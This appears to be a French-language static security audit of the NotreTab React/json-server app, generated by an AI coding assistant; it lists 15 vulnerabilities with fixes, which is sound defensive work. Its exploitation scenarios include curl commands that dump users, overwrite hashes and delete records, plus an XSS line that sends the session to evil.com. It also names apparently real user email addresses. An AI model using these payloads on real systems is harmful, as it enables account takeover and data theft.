# Rapport d'audit de sécurité — NotreTab / SplitEase
**Date :** 29 mai 2026  
**Version analysée :** 1.0.0  
**Auditeur :** Claude Code (analyse statique)  
**Périmètre :** Intégralité du code source (frontend React + backend json-server + PWA)

---

## Résumé exécutif

L'application NotreTab est une SPA React utilisant **json-server comme backend**. Ce choix architectural, acceptable en développement local, présente des **risques critiques si l'application était déployée** en l'état sur un réseau non isolé.

L'analyse a identifié **15 vulnérabilités** réparties comme suit :

| Criticité | Nombre |
|-----------|--------|
| 🔴 Critique | 4 |
| 🟠 Haute    | 4 |
| 🟡 Moyenne  | 4 |
| 🟢 Faible   | 3 |

**Les 4 vulnérabilités critiques sont toutes liées à l'absence totale d'authentification côté serveur.** L'ensemble de la logique de sécurité réside uniquement dans le frontend, ce qui peut être contourné en quelques secondes avec `curl` ou les DevTools du navigateur.

> ⚠️ **Conclusion principale :** L'application NE DOIT PAS être exposée sur Internet ou un réseau partagé sans remplacer json-server par un backend sécurisé. Pour un usage strictement local mono-utilisateur ou en LAN de confiance, le risque est acceptable sous réserve de corriger les vulnérabilités Haute.

---

## Tableau synthétique des vulnérabilités

| ID | Criticité | Fichier principal | Nature | OWASP / CWE |
|----|-----------|-------------------|--------|-------------|
| V01 | 🔴 Critique | `vite.config.js`, `api.js` | API sans authentification serveur | A01:2021 – Broken Access Control |
| V02 | 🔴 Critique | `api.js:24` | Endpoint de dump complet des utilisateurs | A01 / CWE-200 |
| V03 | 🔴 Critique | `api.js:25` | Hash de mot de passe retourné à tout client | A02:2021 – Cryptographic Failures |
| V04 | 🔴 Critique | `api.js` (global) | IDOR sur toutes les ressources | A01 / CWE-639 |
| V05 | 🟠 Haute | `auth.js:35` | Fallback mot de passe en texte clair | A02 / CWE-256 |
| V06 | 🟠 Haute | `Login.jsx:14` | Absence de protection brute force | A07:2021 – Auth Failures / CWE-307 |
| V07 | 🟠 Haute | `auth.js:8,14` | Session dans localStorage (XSS-exploitable) | A02 / CWE-922 |
| V08 | 🟠 Haute | `vite.config.js:9` | Serveur exposé sur 0.0.0.0 (LAN) | A05:2021 – Misconfiguration |
| V09 | 🟡 Moyenne | `serviceWorker.js:66` | Données API mises en cache sans filtre | A02 / CWE-312 |
| V10 | 🟡 Moyenne | `api.js:61-63` | Endpoints bulk non filtrés côté serveur | A01 / CWE-200 |
| V11 | 🟡 Moyenne | Global (headers) | Absence de Content Security Policy | A05 / CWE-693 |
| V12 | 🟡 Moyenne | `db.json` | Données réelles dans le dépôt de code | A02 / CWE-312 |
| V13 | 🟢 Faible | `Login.jsx:40` | Longueur minimale de mot de passe insuffisante | CWE-521 |
| V14 | 🟢 Faible | `Login.jsx:39` | Absence de validation du format email | CWE-20 |
| V15 | 🟢 Faible | `serviceWorker.js:32` | `skipWaiting()` sans vérification d'intégrité | CWE-494 |

---

## Détails techniques

---

### V01 — 🔴 CRITIQUE — API sans authentification serveur

**Fichiers :** `vite.config.js`, `src/utils/api.js`  
**Lignes :** Toute la couche `/api`

**Description**  
Le backend est json-server 0.17, un outil de prototypage qui n'implémente **aucune authentification, aucune session, aucune autorisation**. Toute requête HTTP vers `http://localhost:3001` (ou via le proxy Vite `/api`) est exécutée sans vérification d'identité.

**Scénario d'exploitation**
```bash
# Depuis n'importe quel client sur le réseau :
curl http://<ip-machine>:3001/users           # dump tous les comptes
curl http://<ip-machine>:3001/expenses        # toutes les dépenses
curl -X PATCH http://<ip-machine>:3001/users/aDdL2aa \
  -H "Content-Type: application/json" \
  -d '{"password":"$2b$10$hacked..."}'         # remplacement du hash
curl -X DELETE http://<ip-machine>:3001/users/aDdL2aa  # suppression de compte
```

**Correctif**  
Remplacer json-server par un backend réel avec authentification (Express + JWT ou Next.js API Routes). À minima en développement, lier json-server à `127.0.0.1` uniquement et ajouter un middleware d'authentification :
```bash
# Limiter json-server à localhost uniquement
json-server --watch db.json --port 3001 --host 127.0.0.1
```

---

### V02 — 🔴 CRITIQUE — Endpoint de dump complet des utilisateurs

**Fichier :** `src/utils/api.js`  
**Ligne :** 24

```js
getUsers: () => req('/users'),
```

**Description**  
Cet endpoint retourne **tous les comptes** de l'application, incluant `id`, `email`, `name`, `initials`, `color`, et surtout le **hash bcrypt du mot de passe**. Aucune authentification n'est requise pour l'appeler.

**Scénario d'exploitation**
```bash
curl http://localhost:3001/users
# Réponse : [{id:"aDdL2aa", email:"mickael.tavenart@gmail.com",
#             password:"$2b$10$Qbj...", ...}, ...]
```
L'attaquant récupère tous les hashes, les soumet à hashcat/John avec un dictionnaire et obtient les mots de passe en clair.

**Correctif**  
- Supprimer `getUsers` du client — il n'est pas utilisé dans le code applicatif
- Côté serveur : ne jamais retourner le champ `password` dans les réponses API (middleware de projection)

---

### V03 — 🔴 CRITIQUE — Hash de mot de passe retourné à tout client

**Fichier :** `src/utils/api.js`  
**Ligne :** 25  

```js
getUserByEmail: (email) => req(`/users?email=${encodeURIComponent(email)}`),
```

**Description**  
La recherche par email retourne l'objet utilisateur complet avec son hash bcrypt. Cette fonction est appelée lors du login (`Login.jsx:17`) pour comparer le mot de passe côté client. Le problème : **n'importe quel tiers** peut appeler cet endpoint pour obtenir le hash d'un utilisateur connu.

**Scénario d'exploitation**
```bash
# Récupération ciblée d'un hash
curl "http://localhost:3001/users?email=mickael.tavenart%40gmail.com"
# → {"password":"$2b$10$QbjNNb...", "email":"mickael.tavenart@gmail.com"}
```
La comparaison de mot de passe devrait se faire **côté serveur**. Le frontend ne devrait jamais recevoir le hash.

**Correctif**  
```js
// Côté serveur (à implémenter) :
POST /api/auth/login
Body: { email, password }
→ Serveur compare le hash, retourne { token, user } SANS le champ password
```

---

### V04 — 🔴 CRITIQUE — IDOR généralisé (Insecure Direct Object Reference)

**Fichier :** `src/utils/api.js` (global)  
**Nature :** CWE-639

**Description**  
Aucune vérification d'appartenance n'est effectuée côté serveur. Un utilisateur authentifié (ou non) peut manipuler **n'importe quelle ressource** en connaissant son ID :

| Endpoint | Impact |
|----------|--------|
| `PATCH /users/:id` | Modifier le compte de n'importe qui |
| `DELETE /users/:id` | Supprimer n'importe quel compte |
| `PATCH /expenses/:id` | Modifier n'importe quelle dépense |
| `DELETE /members/:id` | Expulser n'importe quel membre de n'importe quel groupe |
| `GET /members?userId=x` | Voir les groupes de n'importe quel utilisateur |

**Scénario d'exploitation**
```bash
# Utilisateur B modifie le compte de l'utilisateur A
curl -X PATCH http://localhost:3001/users/aDdL2aa \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# Suppression silencieuse de toutes les dépenses d'un groupe
for id in 1 2 3 4 5; do
  curl -X DELETE http://localhost:3001/expenses/$id
done
```

**Correctif**  
Implémenter un middleware d'autorisation côté serveur qui vérifie que l'utilisateur authentifié est bien propriétaire de la ressource ciblée.

---

### V05 — 🟠 HAUTE — Fallback mot de passe en texte clair

**Fichier :** `src/utils/auth.js`  
**Ligne :** 35

```js
if (!stored.startsWith('$2')) return Promise.resolve(stored === password)
```

**Description**  
Les comptes "legacy" dont le mot de passe ne commence pas par `$2` (préfixe bcrypt) sont comparés **en texte clair**. Si un enregistrement en clair existe en base (par erreur de manipulation, import, ou injection), le mot de passe est exposé.

**Scénario d'exploitation**  
Un attaquant ayant accès en lecture à `db.json` (ou à l'endpoint `/users`) voit immédiatement le mot de passe en clair dans le champ `password`.

**Correctif**  
```js
// Supprimer le fallback — forcer la migration préalable
export function verifyPassword(password, stored) {
  if (!stored || !stored.startsWith('$2')) return Promise.resolve(false)
  return bcrypt.compare(password, stored)
}
```
S'assurer qu'aucun compte avec mot de passe en clair n'existe en base avant de déployer.

---

### V06 — 🟠 HAUTE — Absence de protection brute force

**Fichier :** `src/pages/Login.jsx`  
**Lignes :** 14–33

**Description**  
La fonction `handleLogin` ne limite pas le nombre de tentatives de connexion. Il n'y a ni délai, ni captcha, ni verrouillage de compte. Combiné à V03 (récupération des hashes), un attaquant peut :
1. Récupérer tous les hashes via l'API
2. Tenter une attaque dictionnaire offline
3. OU automatiser des appels login à vitesse maximale

**Scénario d'exploitation**
```js
// Script automatisé — 1000 tentatives sans blocage
for (const pwd of passwordList) {
  await fetch('/api/users?email=target@example.com').then(...)
  // bcrypt côté client = pas de délai réseau pour le brute force
}
```

**Correctif**  
- Côté serveur : rate limiting (ex. 5 tentatives / 15 min par IP)
- Côté client (atténuation) : délai exponentiel après échec
```js
// Délai croissant côté client
const delay = Math.min(1000 * Math.pow(2, failCount), 30000)
await new Promise(r => setTimeout(r, delay))
```

---

### V07 — 🟠 HAUTE — Session stockée dans localStorage

**Fichier :** `src/utils/auth.js`  
**Lignes :** 8, 14

```js
const SESSION_KEY = 'notretab_user'
localStorage.setItem(SESSION_KEY, JSON.stringify(safe))
```

**Description**  
La session utilisateur est persistée dans `localStorage`, accessible par **tout JavaScript** de la page. En cas de XSS (injection de script tiers, extension malveillante, CDN compromis), l'attaquant peut exfiltrer la session.

De plus, la session **n'expire jamais** : une session volée reste valide indéfiniment.

**Scénario d'exploitation**  
```js
// XSS payload (ex. via un nom de dépense malveillant si le rendu n'est pas sécurisé)
fetch('https://evil.com/steal?d=' + btoa(localStorage.getItem('notretab_user')))
```

**Correctif**  
- Utiliser `sessionStorage` (effacé à la fermeture de l'onglet) pour les sessions sans "se souvenir de moi"  
- Ajouter une expiration explicite :
```js
export function setSession(user) {
  const { password, ...safe } = user
  const payload = { ...safe, expiresAt: Date.now() + 8 * 3600 * 1000 } // 8h
  localStorage.setItem(SESSION_KEY, JSON.stringify(payload))
}

export function getSession() {
  try {
    const raw = localStorage.getItem(SESSION_KEY)
    if (!raw) return null
    const data = JSON.parse(raw)
    if (data.expiresAt && Date.now() > data.expiresAt) {
      localStorage.removeItem(SESSION_KEY)
      return null
    }
    return data
  } catch { return null }
}
```

---

### V08 — 🟠 HAUTE — Serveur exposé sur toutes les interfaces réseau

**Fichier :** `vite.config.js`  
**Ligne :** 9

```js
host: '0.0.0.0', // Expose sur tous les adaptateurs réseau (WiFi, etc.)
```

**Description**  
Le serveur Vite (et par extension le proxy vers json-server) écoute sur `0.0.0.0`, rendant l'application et son API accessibles **par n'importe quel appareil sur le même réseau WiFi/LAN**. Combiné aux vulnérabilités V01–V04, cela expose toutes les données à quiconque partage le réseau.

**Correctif**  
```js
// vite.config.js — restreindre à localhost en développement
server: {
  host: '127.0.0.1', // ou supprimer la ligne (127.0.0.1 par défaut)
  proxy: { ... }
}
```
Si l'accès depuis d'autres appareils est nécessaire (tests mobiles), l'activer **explicitement** avec une variable d'environnement :
```js
host: process.env.VITE_EXPOSE_LAN === 'true' ? '0.0.0.0' : '127.0.0.1',
```

---

### V09 — 🟡 MOYENNE — Données API mises en cache par le Service Worker

**Fichier :** `public/serviceWorker.js`  
**Lignes :** 66–94

**Description**  
Le Service Worker met en cache toutes les réponses GET de `/api` (Network-first avec fallback cache). Cela inclut `/api/users` (hashes de mots de passe) et `/api/expenses` (données financières). Sur un appareil partagé, ces données restent accessibles hors ligne via `caches.match()`.

**Scénario d'exploitation**  
```js
// Depuis la console d'un navigateur partagé, après déconnexion de l'utilisateur :
const cache = await caches.open('notretab-v1-api')
const resp = await cache.match('/api/users')
const data = await resp.json()
// → accès aux emails et hashes de tous les utilisateurs
```

**Correctif**  
```js
// Ne pas cacher les endpoints sensibles
const SENSITIVE_PATHS = ['/users', '/members']
if (url.pathname.startsWith('/api')) {
  const isSensitive = SENSITIVE_PATHS.some(p => url.pathname.includes(p))
  if (isSensitive) {
    event.respondWith(fetch(request)) // pas de cache
    return
  }
  // ... cache normal pour /expenses, /payments
}
```

---

### V10 — 🟡 MOYENNE — Endpoints bulk sans filtrage serveur

**Fichier :** `src/utils/api.js`  
**Lignes :** 61–63

```js
getAllMembers:  () => req('/members'),
getAllExpenses: () => req('/expenses?_sort=date&_order=desc'),
getAllPayments: () => req('/payments?_sort=createdAt&_order=desc'),
```

**Description**  
Ces trois endpoints retournent **l'intégralité des données de tous les groupes** sans filtre. Le filtrage par appartenance au groupe se fait **côté client** dans `Dashboard.jsx`. Cela signifie que :
- Toutes les dépenses de tous les utilisateurs transitent dans le navigateur
- Un utilisateur peut lire les dépenses de groupes dont il n'est pas membre en appelant l'API directement

**Correctif**  
Filtrer côté serveur par `userId` (requiert un vrai backend) :
```
GET /api/my-expenses → retourne uniquement les dépenses des groupes de l'utilisateur authentifié
```
En attendant, remplacer `getAllExpenses()` par des appels filtrés par `groupId` pour chaque groupe de l'utilisateur.

---

### V11 — 🟡 MOYENNE — Absence de Content Security Policy

**Fichier :** Configuration serveur (absente)  
**Nature :** CWE-693

**Description**  
Aucun en-tête `Content-Security-Policy` n'est configuré. En cas d'injection XSS, un attaquant peut :
- Charger des scripts depuis n'importe quelle origine
- Exfiltrer des données vers un domaine tiers
- Injecter des iframes malveillantes

**Correctif**  
Ajouter dans `vite.config.js` (pour le dev) et dans la configuration du serveur de production :
```js
// vite.config.js
server: {
  headers: {
    'Content-Security-Policy': 
      "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self'",
    'X-Frame-Options': 'DENY',
    'X-Content-Type-Options': 'nosniff',
  }
}
```

---

### V12 — 🟡 MOYENNE — db.json avec données réelles commis dans le dépôt

**Fichier :** `db.json`

**Description**  
Le fichier `db.json` contient des données réelles (emails, hashes bcrypt, données financières) et est commis dans le dépôt Git. Si le dépôt est partagé (GitHub, GitLab), ces données sont exposées publiquement.

**Contenu sensible dans db.json :**
- Emails réels : `mickael.tavenart@gmail.com`, `toto@gmail.com`
- Hashes bcrypt (attaquables hors ligne)
- Données financières : montants, descriptions de dépenses

**Correctif**  
```gitignore
# .gitignore
db.json
db.example.json  # Créer un exemple sans données réelles
```
Migrer les données de test vers un fichier `db.example.json` avec des données fictives uniquement.

---

### V13 — 🟢 FAIBLE — Longueur minimale de mot de passe insuffisante

**Fichier :** `src/pages/Login.jsx`  
**Ligne :** 40

```js
if (form.password.length < 6) { setError('Mot de passe trop court (6 caractères minimum)'); return }
```

**Description**  
6 caractères est en dessous des recommandations NIST SP 800-63B (8 caractères minimum, idéalement 12+). Un mot de passe de 6 caractères alpha-numérique offre ~2,2 milliards de combinaisons, cassables en quelques minutes avec du matériel moderne.

**Correctif**  
```js
if (form.password.length < 8) { setError('Mot de passe trop court (8 caractères minimum)') }
```
Ajouter une indication de force (indicateur visuel).

---

### V14 — 🟢 FAIBLE — Absence de validation du format email

**Fichier :** `src/pages/Login.jsx`  
**Ligne :** 39

```js
if (!form.email.trim()) { setError('Email requis.'); return }
```

**Description**  
Seule la présence de l'email est vérifiée, pas son format. Un email invalide (ex. `notanemail`) peut être enregistré, causant des problèmes lors de futures notifications ou récupérations de compte.

**Correctif**  
```js
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
if (!EMAIL_RE.test(form.email.trim())) { setError('Format d\'email invalide.'); return }
```

---

### V15 — 🟢 FAIBLE — skipWaiting() sans vérification d'intégrité

**Fichier :** `public/serviceWorker.js`  
**Lignes :** 32, 132–134

```js
self.skipWaiting() // Force activation immédiate
// ET
self.addEventListener('message', (event) => {
  if (event.data && event.data.type === 'SKIP_WAITING') {
    self.skipWaiting()
  }
})
```

**Description**  
Le Service Worker peut être forcé à s'activer immédiatement via un message `SKIP_WAITING`. Sans vérification de l'origine du message, une page compromise pourrait déclencher un remplacement prématuré du SW par une version malveillante (si l'attaquant contrôle le déploiement).

**Correctif**  
```js
self.addEventListener('message', (event) => {
  // Vérifier l'origine avant d'accepter le message
  if (event.origin !== self.location.origin) return
  if (event.data?.type === 'SKIP_WAITING') self.skipWaiting()
})
```
Supprimer le `skipWaiting()` à l'install (laisser le cycle de vie normal du SW gérer la mise à jour).

---

## Recommandations générales

### Priorité immédiate (avant tout déploiement)

1. **Remplacer json-server par un backend réel** avec authentification JWT ou sessions sécurisées. Express.js + better-auth ou Supabase sont des options adaptées à ce type de projet.

2. **Déplacer la comparaison de mot de passe côté serveur.** Le frontend ne doit jamais recevoir de hash ni de mot de passe.

3. **Ajouter un middleware d'autorisation** qui vérifie à chaque requête que l'utilisateur authentifié a le droit d'accéder à la ressource demandée.

4. **Ajouter db.json au `.gitignore`** et purger l'historique Git si le dépôt est public (`git filter-repo --path db.json --invert-paths`).

### Priorité haute (bonne pratique)

5. **Implémenter un rate limiting** sur les endpoints d'authentification (5 tentatives/15 min).

6. **Ajouter une expiration de session** (8h recommandé pour ce type d'app).

7. **Restreindre `host` à `127.0.0.1`** dans `vite.config.js`.

8. **Configurer des en-têtes de sécurité HTTP** : CSP, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security.

### Priorité normale

9. **Exclure les endpoints sensibles du cache Service Worker** (`/users`, `/members`).

10. **Augmenter la longueur minimale du mot de passe** à 8 caractères et ajouter un indicateur de force.

11. **Valider le format email** côté client ET serveur.

12. **Supprimer l'endpoint `getUsers()`** qui n'est pas utilisé dans l'application.

---

## Architecture cible sécurisée

```
┌─────────────────────────────────────────────────────────────┐
│  Client React                                               │
│  - Pas de hash, pas de données sensibles brutes             │
│  - Session JWT dans httpOnly cookie (pas localStorage)      │
│  - CSP headers                                              │
└─────────────────────┬───────────────────────────────────────┘
                      │ HTTPS
┌─────────────────────▼───────────────────────────────────────┐
│  Backend sécurisé (Express / Next.js / Supabase)            │
│  - POST /auth/login → vérifie hash, retourne JWT            │
│  - Middleware JWT sur toutes les routes protégées           │
│  - Autorisation par ressource (userId === owner)            │
│  - Rate limiting (express-rate-limit)                       │
│  - Projection : jamais de champ password dans les réponses  │
└─────────────────────┬───────────────────────────────────────┘
                      │
┌─────────────────────▼───────────────────────────────────────┐
│  Base de données (PostgreSQL / SQLite)                      │
│  - Chiffrement at rest                                      │
│  - Backups chiffrés                                         │
│  - db.json hors du dépôt Git                                │
└─────────────────────────────────────────────────────────────┘
```

---

*Rapport généré par analyse statique du code source. Une analyse dynamique (pentest) sur un environnement de staging permettrait de confirmer l'exploitabilité réelle de ces vulnérabilités.*
